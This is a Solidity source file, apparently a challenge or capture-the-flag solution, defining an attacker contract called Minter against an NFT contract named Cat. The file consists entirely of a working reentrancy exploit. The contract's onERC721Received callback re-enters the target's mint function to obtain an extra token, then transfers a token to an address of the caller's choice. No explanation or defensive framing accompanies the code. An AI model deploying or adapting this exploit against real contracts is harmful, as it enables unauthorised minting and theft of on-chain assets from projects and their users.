// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

interface Cat {
    function mint(address to) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
}

contract Minter {
    address public target;
    uint256 public count;

    constructor(address _target) {
        target = _target;
    }

    function mint(address to) external {
        count = 1;
        Cat(target).mint(address(this));
        Cat(target).transferFrom(address(this), to, Cat(target).totalSupply() - 2);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (count > 0) {
            count--;
            Cat(target).mint(address(this));
        }
        return this.onERC721Received.selector;
    }
}
